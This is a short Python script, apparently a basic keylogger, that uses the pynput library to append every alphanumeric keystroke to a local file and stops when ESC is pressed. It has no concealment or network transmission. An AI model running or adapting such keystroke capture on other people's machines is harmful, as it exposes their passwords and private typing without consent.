from pynput import keyboard

log_file = "D:\ keylog.txt"

# Function to handle key press events
def on_press(key):
    try:
        # Log only alphanumeric characters
        if key.char.isalnum():
            with open(log_file, "a") as f:
                f.write(f"{key.char}")
    except AttributeError:
        # Ignore special keys like Shift, Ctrl, etc.
        pass

# Stop the keylogger when ESC is pressed
def on_release(key):
    if key == keyboard.Key.esc:
        return False

# Set up the listener for key events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()